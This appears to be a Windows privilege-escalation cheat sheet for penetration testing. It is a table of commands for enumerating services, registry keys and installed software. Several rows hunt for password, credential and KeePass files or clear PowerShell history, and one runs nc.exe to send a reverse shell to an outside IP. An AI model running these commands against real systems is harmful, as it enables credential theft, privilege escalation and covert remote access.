# Windows Command Cheat Sheet

| Command | Description |
|---------|-------------|
| `whoami /priv` | Show privileges |
| `whoami /all` | Show all info |
| `dir /a` | Show hidden files |
| `cd C:\ & findstr /SI /M "password" *.xml *.ini *.txt` | Search for file contents |
| `findstr /si password *.xml *.ini *.txt *.config` | Search for file contents |
| `findstr /spin "password" *.*` | Search for file contents |
| `dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*` | Search for file contents |
| `where /R C:\ user.txt` | Search for file |
| `where /R C:\ *.ini` | Search for file |
| `Get-ChildItem -Path C:\xampp -Include *.txt,*.ini -File -Recurse -ErrorAction SilentlyContinue` | Search files recursively |
| `Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue` | Search KeePass DB files |
| `(32 bit app)` | Check installed applications |
| `Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" \| select displayname` | Installed apps (32-bit) |
| `(64 bit app)` | Check installed applications |
| `Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*" \| select displayname` | Installed apps (64-bit) |
| `Get-Process \| Select ProcessName, Path` | Show running processes |
| `runas /user: cmd` | Usable only when GUI access is available |
| `get-history (clear-history)` | Clear PowerShell history |
| `(Get-PSReadlineOption).HistorySavePath` | Show PowerShell history path |
| `$PSVersionTable` | PowerShell version information |
| `Get-CimInstance -ClassName win32_service \| Select Name, StartMode \| Where-Object {$_.Name -like "kite"}` | List services (filter by name) |
| `Get-CimInstance -ClassName win32_service \| Select Name, StartMode \| Where-Object {$_.State -like 'Running'}` | List running services |
| `Get-ScheduledTask` | Show scheduled tasks |
| `schtasks /query /fo LIST /v` | Show scheduled tasks (verbose) |
| `Get-CimInstance -ClassName win32_service \| Select Name, StartMode \| Where-Object {$_.Name -like 'mysql'}` | Check service startup type; if Auto and has SeShutDownPrivilege → reboot |
| `shutdown /r /t 0` | Reboot the machine |
| `tasklist /v \| findstr mysqld` | Check service execution privileges |
| `sc qc "ServiceName"` | If Service_Start_Name = LocalSystem → possible privilege escalation |
| `runas /user:Administrator "nc.exe -e cmd.exe 192.168.45.175 4444"` | Execute reverse shell |
| `reg query hklm\system\currentcontrolset\services` | List services |
| `reg query hklm\system\currentcontrolset\services\ZSATunnel` | Check .exe file |
| `HKLM\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Run` | Auto-start (32-bit) |
| `HKLM\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall` | Installed app info (32-bit) |
| `HKLM\SOFTWARE\WOW6432Node\YourAppVendor\YourAppName` | App config (32-bit) |
| `Get-WmiObject Win32_Service \| Select-Object Name, StartName \| findstr VeyonService` | Check service execution user; if LocalSystem → SYSTEM |
| `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System EnableLUA` | 1 = UAC enabled |
| `HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced Hidden` | 1 = Show hidden files |
| `reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated` | Always install elevated; MSI files will be installed as SYSTEM |
| `reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated` | Always install elevated; MSI files will be installed as SYSTEM |
| `# Check if registry key is enabled` | Verify transcription settings |
| `reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\Transcription` | Check transcription |
| `reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\Transcription` | Check transcription |
| `reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription` | Check transcription |
| `reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription` | Check transcription |
| `dir C:\Transcripts` | Check transcript files |
| `Start-Transcript -Path "C:\transcripts\transcript0.txt" -NoClobber` | Start transcript session |
| `Stop-Transcript` | Stop transcript session |
